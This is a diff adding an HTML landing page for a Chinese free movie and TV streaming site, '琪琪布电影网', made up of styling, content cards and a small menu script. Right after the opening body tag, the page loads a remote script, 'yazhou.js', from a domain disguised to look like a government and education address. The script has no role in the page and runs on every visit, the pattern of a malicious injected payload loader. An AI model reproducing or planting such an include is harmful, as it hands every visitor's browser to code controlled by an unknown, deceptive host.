@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>琪琪布电影网 - 高清影视在线观看</title>
+    <meta name="keywords" content="琪琪布电影网, qiqibudianyingwang-app, 在线电影, 高清影视">
+    <meta name="description" content="琪琪布电影网(https://qiqibudianyingwang-app)提供最新高清电影、电视剧、综艺在线观看，资源全面，播放流畅。">
+    <style>
+        :root {
+            --primary: #00f2fe;
+            --secondary: #4facfe;
+            --dark: #0a0a1a;
+            --darker: #050510;
+            --light: #e6f7ff;
+            --glass: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+        }
+
+        body {
+            background-color: var(--darker);
+            color: var(--light);
+            line-height: 1.6;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* 动态背景效果 */
+        .bg-shapes {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .shape {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(60px);
+            opacity: 0.3;
+        }
+
+        .shape-1 {
+            width: 300px;
+            height: 300px;
+            background: #00f2fe;
+            top: -100px;
+            left: -100px;
+        }
+
+        .shape-2 {
+            width: 400px;
+            height: 400px;
+            background: #4facfe;
+            bottom: -150px;
+            right: -100px;
+        }
+
+        .shape-3 {
+            width: 200px;
+            height: 200px;
+            background: #7367f0;
+            top: 50%;
+            left: 60%;
+            transform: translate(-50%, -50%);
+        }
+
+        /* 导航栏 */
+        header {
+            background: var(--glass);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--glass-border);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            padding: 1rem 0;
+        }
+
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-decoration: none;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+        }
+
+        .nav-links a {
+            color: var(--light);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+            position: relative;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            transition: width 0.3s;
+        }
+
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            color: var(--light);
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        /* 主内容区 */
+        main {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 8rem 2rem 4rem;
+        }
+
+        .hero {
+            display: flex;
+            align-items: center;
+            gap: 4rem;
+            margin-bottom: 5rem;
+        }
+
+        .hero-content {
+            flex: 1;
+        }
+
+        .hero-title {
+            font-size: 3rem;
+            font-weight: 800;
+            margin-bottom: 1.5rem;
+            line-height: 1.2;
+        }
+
+        .hero-title span {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero-description {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            margin-bottom: 2rem;
+            max-width: 600px;
+        }
+
+        .url-box {
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            border-radius: 12px;
+            padding: 1rem 1.5rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 2rem;
+            backdrop-filter: blur(5px);
+        }
+
+        .url-box a {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .url-box a:hover {
+            text-decoration: underline;
+        }
+
+        .cta-button {
+            display: inline-block;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: var(--darker);
+            padding: 0.8rem 2rem;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: transform 0.3s, box-shadow 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 242, 254, 0.2);
+        }
+
+        .hero-image {
+            flex: 1;
+            position: relative;
+        }
+
+        .hero-image img {
+            width: 100%;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--glass-border);
+        }
+
+        /* 栏目部分 */
+        .section {
+            margin-bottom: 5rem;
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            margin-bottom: 2rem;
+        }
+
+        .section-title {
+            font-size: 2rem;
+            font-weight: 700;
+            position: relative;
+            padding-bottom: 0.5rem;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 50px;
+            height: 3px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+        }
+
+        .view-all {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 2rem;
+        }
+
+        .card {
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            border-radius: 15px;
+            overflow: hidden;
+            transition: transform 0.3s, box-shadow 0.3s;
+            backdrop-filter: blur(5px);
+        }
+
+        .card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .card-image {
+            width: 100%;
+            height: 160px;
+            object-fit: cover;
+        }
+
+        .card-content {
+            padding: 1.5rem;
+        }
+
+        .card-title {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .card-description {
+            opacity: 0.8;
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+        }
+
+        .card-link {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 0.9rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.3rem;
+        }
+
+        /* 关于我们 */
+        .about-content {
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 3rem;
+            backdrop-filter: blur(5px);
+        }
+
+        .about-text {
+            margin-bottom: 1.5rem;
+        }
+
+        /* 页脚 */
+        footer {
+            background: var(--glass);
+            border-top: 1px solid var(--glass-border);
+            padding: 3rem 0;
+            text-align: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        .footer-logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1.5rem;
+            display: inline-block;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-bottom: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: var(--light);
+            text-decoration: none;
+            opacity: 0.8;
+            transition: opacity 0.3s;
+        }
+
+        .footer-links a:hover {
+            opacity: 1;
+            color: var(--primary);
+        }
+
+        .copyright {
+            opacity: 0.6;
+            font-size: 0.9rem;
+        }
+
+        /* 移动端适配 */
+        @media (max-width: 992px) {
+            .hero {
+                flex-direction: column;
+                gap: 2rem;
+            }
+
+            .hero-content {
+                order: 2;
+            }
+
+            .hero-image {
+                order: 1;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .nav-links {
+                position: fixed;
+                top: 70px;
+                left: 0;
+                width: 100%;
+                background: var(--darker);
+                flex-direction: column;
+                align-items: center;
+                padding: 2rem 0;
+                gap: 1.5rem;
+                clip-path: circle(0% at top right);
+                transition: clip-path 0.5s ease-in-out;
+            }
+
+            .nav-links.active {
+                clip-path: circle(150% at top right);
+            }
+
+            .mobile-menu-btn {
+                display: block;
+            }
+
+            .hero-title {
+                font-size: 2.2rem;
+            }
+
+            .section-header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 1rem;
+            }
+
+            .about-content {
+                padding: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+    <!-- 动态背景 -->
+    <div class="bg-shapes">
+        <div class="shape shape-1"></div>
+        <div class="shape shape-2"></div>
+        <div class="shape shape-3"></div>
+    </div>
+
+    <!-- 导航栏 -->
+    <header>
+        <div class="nav-container">
+            <a href="#" class="logo">琪琪布电影网</a>
+            <button class="mobile-menu-btn" id="mobileMenuBtn">☰</button>
+            <nav class="nav-links" id="navLinks">
+                <a href="#home">首页</a>
+                <a href="#movies">电影库</a>
+                <a href="#tv">电视剧</a>
+                <a href="#about">关于我们</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- 主内容区 -->
+    <main>
+        <!-- 首页栏目 -->
+        <section class="hero" id="home">
+            <div class="hero-content">
+                <h1 class="hero-title">欢迎来到<span>琪琪布电影网</span></h1>
+                <p class="hero-description">提供最新、最热、最全的高清影视资源，包括电影、电视剧、综艺、动漫等，每日更新，免费在线观看。</p>
+                <div class="url-box">
+                    <span>官方网站：</span>
+                    <a href="https://qiqibudianyingwang-app" target="_blank">qiqibudianyingwang-app</a>
+                </div>
+                <br>
+                <a href="#movies" class="cta-button">立即观看</a>
+            </div>
+            <div class="hero-image">
+                <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='600' height='400' viewBox='0 0 600 400'%3E%3Crect fill='%23111' width='600' height='400'/%3E%3Ctext fill='%2300f2fe' font-family='Arial' font-size='30' font-weight='bold' x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle'%3E琪琪布电影网%3C/text%3E%3C/svg%3E" alt="琪琪布电影网">
+            </div>
+        </section>
+
+        <!-- 电影库栏目 -->
+        <section class="section" id="movies">
+            <div class="section-header">
+                <h2 class="section-title">电影库</h2>
+                <a href="#" class="view-all">查看全部 →</a>
+            </div>
+            <div class="grid">
+                <div class="card">
+                    <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='160' viewBox='0 0 300 160'%3E%3Crect fill='%23222' width='300' height='160'/%3E%3Ctext fill='%234facfe' font-family='Arial' font-size='16' x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle'%3E热门电影%3C/text%3E%3C/svg%3E" alt="热门电影" class="card-image">
+                    <div class="card-content">
+                        <h3 class="card-title">热门电影推荐</h3>
+                        <p class="card-description">最新上映的院线大片，高清画质，流畅播放。</p>
+                        <a href="#" class="card-link">立即观看 →</a>
+                    </div>
+                </div>
+                <div class="card">
+                    <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='160' viewBox='0 0 300 160'%3E%3Crect fill='%23222' width='300' height='160'/%3E%3Ctext fill='%234facfe' font-family='Arial' font-size='16' x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle'%3E经典电影%3C/text%3E%3C/svg%3E" alt="经典电影" class="card-image">
+                    <div class="card-content">
+                        <h3 class="card-title">经典电影回顾</h3>
+                        <p class="card-description">影史经典作品，重温不朽的银幕传奇。</p>
+                        <a href="#" class="card-link">立即观看 →</a>
+                    </div>
+                </div>
+                <div class="card">
+                    <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='160' viewBox='0 0 300 160'%3E%3Crect fill='%23222' width='300' height='160'/%3E%3Ctext fill='%234facfe' font-family='Arial' font-size='16' x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle'%3E分类浏览%3C/text%3E%3C/svg%3E" alt="分类浏览" class="card-image">
+                    <div class="card-content">
+                        <h3 class="card-title">电影分类浏览</h3>
+                        <p class="card-description">按类型、地区、年份筛选，快速找到想看的电影。</p>
+                        <a href="#" class="card-link">立即观看 →</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 电视剧栏目 -->
+        <section class="section" id="tv">
+            <div class="section-header">
+                <h2 class="section-title">电视剧</h2>
+                <a href="#" class="view-all">查看全部 →</a>
+            </div>
+            <div class="grid">
+                <div class="card">
+                    <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='160' viewBox='0 0 300 160'%3E%3Crect fill='%23222' width='300' height='160'/%3E%3Ctext fill='%234facfe' font-family='Arial' font-size='16' x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle'%3E国产剧%3C/text%3E%3C/svg%3E" alt="国产剧" class="card-image">
+                    <div class="card-content">
+                        <h3 class="card-title">国产电视剧</h3>
+                        <p class="card-description">最新热门国产剧集，同步更新，完整版在线观看。</p>
+                        <a href="#" class="card-link">立即观看 →</a>
+                    </div>
+                </div>
+                <div class="card">
+                    <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='160' viewBox='0 0 300 160'%3E%3Crect fill='%23222' width='300' height='160'/%3E%3Ctext fill='%234facfe' font-family='Arial' font-size='16' x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle'%3E美剧%3C/text%3E%3C/svg%3E" alt="美剧" class="card-image">
+                    <div class="card-content">
+                        <h3 class="card-title">欧美电视剧</h3>
+                        <p class="card-description">热门美剧、英剧，中英双语字幕，高清资源。</p>
+                        <a href="#" class="card-link">立即观看 →</a>
+                    </div>
+                </div>
+                <div class="card">
+                    <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='160' viewBox='0 0 300 160'%3E%3Crect fill='%23222' width='300' height='160'/%3E%3Ctext fill='%234facfe' font-family='Arial' font-size='16' x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle'%3E韩剧%3C/text%3E%3C/svg%3E" alt="韩剧" class="card-image">
+                    <div class="card-content">
+                        <h3 class="card-title">韩剧日剧</h3>
+                        <p class="card-description">最新韩剧、日剧，浪漫爱情、悬疑推理一应俱全。</p>
+                        <a href="#" class="card-link">立即观看 →</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 关于我们栏目 -->
+        <section class="section" id="about">
+            <div class="section-header">
+                <h2 class="section-title">关于我们</h2>
+            </div>
+            <div class="about-content">
+                <p class="about-text"><strong>琪琪布电影网</strong>（网址：<a href="https://qiqibudianyingwang-app" style="color: var(--primary);">qiqibudianyingwang-app</a>）是一个专注于提供高清影视资源的在线观看平台。</p>
+                <p class="about-text">我们致力于为用户提供最新、最全、最清晰的电影、电视剧、综艺、动漫等视频内容，所有资源均经过精心筛选，确保播放流畅、画质优良。</p>
+                <p class="about-text">网站每日更新，涵盖国内外各类影视作品，满足不同用户的观影需求。无论您喜欢好莱坞大片、国产佳作，还是小众独立电影，都能在这里找到心仪的内容。</p>
+                <p class="about-text">琪琪布电影网，您的专属私人影院，随时随地享受观影乐趣！</p>
+            </div>
+        </section>
+    </main>
+
+    <!-- 页脚 -->
+    <footer>
+        <div class="footer-content">
+            <a href="#" class="footer-logo">琪琪布电影网</a>
+            <div class="footer-links">
+                <a href="#home">首页</a>
+                <a href="#movies">电影库</a>
+                <a href="#tv">电视剧</a>
+                <a href="#about">关于我们</a>
+                <a href="#">免责声明</a>
+                <a href="#">联系我们</a>
+            </div>
+            <p class="copyright">© 2024 琪琪布电影网 qiqibudianyingwang-app. 保留所有权利。</p>
+        </div>
+    </footer>
+
+    <script>
+        // 移动端菜单切换
+        const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+        const navLinks = document.getElementById('navLinks');
+
+        mobileMenuBtn.addEventListener('click', () => {
+            navLinks.classList.toggle('active');
+        });
+
+        // 平滑滚动
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                
+                if(this.getAttribute('href') === '#') return;
+                
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    window.scrollTo({
+                        top: target.offsetTop - 70,
+                        behavior: 'smooth'
+                    });
+                    
+                    // 关闭移动端菜单
+                    navLinks.classList.remove('active');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
